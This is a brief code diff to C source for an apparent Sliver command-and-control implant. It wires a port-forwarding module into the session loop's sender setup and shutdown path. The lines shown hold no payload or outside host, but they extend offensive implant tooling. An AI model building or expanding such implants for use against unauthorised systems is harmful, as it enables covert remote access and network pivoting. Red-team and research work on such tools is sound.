@@ -198,6 +198,7 @@ int sliver_session_run(const sliver_session_config_t *cfg) {
   tx.stop = 0;
   g_tx = &tx;
   sliver_shell_set_sender(shell_send_adapter);
+  sliver_portfwd_set_sender(shell_send_adapter);
 
   /* Register: Envelope{Type = MsgRegister, Data = Register}. */
   reg = cfg->reg;
@@ -292,6 +293,7 @@ int sliver_session_run(const sliver_session_config_t *cfg) {
 out:
   tx.stop = 1;
   sliver_shell_shutdown();
+  sliver_portfwd_shutdown();
   g_tx = NULL;
   if (heartbeat != NULL) {
     (void)sliver_thread_join(heartbeat);
@@ -310,6 +312,7 @@ out:
   }
   return rc;
 }
+
 
 
 
